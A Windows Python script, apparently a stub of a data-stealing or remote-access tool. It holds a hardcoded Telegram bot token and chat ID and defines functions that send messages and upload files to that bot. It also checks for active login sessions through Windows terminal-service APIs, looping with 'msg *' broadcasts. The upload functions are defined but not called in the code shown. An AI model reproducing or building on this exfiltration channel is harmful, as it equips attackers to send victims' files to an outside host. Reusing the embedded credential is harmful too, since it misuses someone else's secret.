#don't delete
import requests
import subprocess
import os
import tempfile
import importlib.util
import string
import time
import sys
import ctypes
import ctypes.wintypes

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def is_user_logged_in():
    WTS_CURRENT_SERVER_HANDLE = 0
    WTS_CURRENT_SESSION = -1

    WTSUserName = 5
    WTSDomainName = 7

    WTSActive = 0

    class WTS_SESSION_INFO(ctypes.Structure):
        _fields_ = [
            ('SessionId', ctypes.wintypes.DWORD),
            ('pWinStationName', ctypes.wintypes.LPWSTR),
            ('State', ctypes.wintypes.DWORD)
        ]

    WTS_SESSION_INFOPtr = ctypes.POINTER(WTS_SESSION_INFO)

    wtsapi32 = ctypes.windll.wtsapi32

    WTSEnumerateSessions = wtsapi32.WTSEnumerateSessionsW
    WTSEnumerateSessions.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(WTS_SESSION_INFOPtr), ctypes.POINTER(ctypes.wintypes.DWORD)]
    WTSEnumerateSessions.restype = ctypes.wintypes.BOOL

    WTSFreeMemory = wtsapi32.WTSFreeMemory

    WTSQuerySessionInformation = wtsapi32.WTSQuerySessionInformationW
    WTSQuerySessionInformation.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.LPWSTR), ctypes.POINTER(ctypes.wintypes.DWORD)]
    WTSQuerySessionInformation.restype = ctypes.wintypes.BOOL

    sessions = WTS_SESSION_INFOPtr()
    count = ctypes.wintypes.DWORD()

    if WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, ctypes.byref(sessions), ctypes.byref(count)):
        for i in range(count.value):
            session = sessions[i]
            if session.State == WTSActive:
                user_name = ctypes.wintypes.LPWSTR()
                domain_name = ctypes.wintypes.LPWSTR()
                user_name_len = ctypes.wintypes.DWORD()
                domain_name_len = ctypes.wintypes.DWORD()

                if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSUserName, ctypes.byref(user_name), ctypes.byref(user_name_len)):
                    if WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, session.SessionId, WTSDomainName, ctypes.byref(domain_name), ctypes.byref(domain_name_len)):
                        if user_name.value and domain_name.value:
                            print(f"User {domain_name.value}\\{user_name.value} is logged in on session {session.SessionId}.")
                            WTSFreeMemory(user_name)
                            WTSFreeMemory(domain_name)
                            WTSFreeMemory(sessions)
                            return True
                WTSFreeMemory(user_name)
                WTSFreeMemory(domain_name)

        WTSFreeMemory(sessions)

    print("No user is currently logged in.")
    return False

while True:
    if is_user_logged_in():
        os.system("msg * userlogged")
        break
    else:
        os.system("msg * usernotlogged")
    time.sleep(5)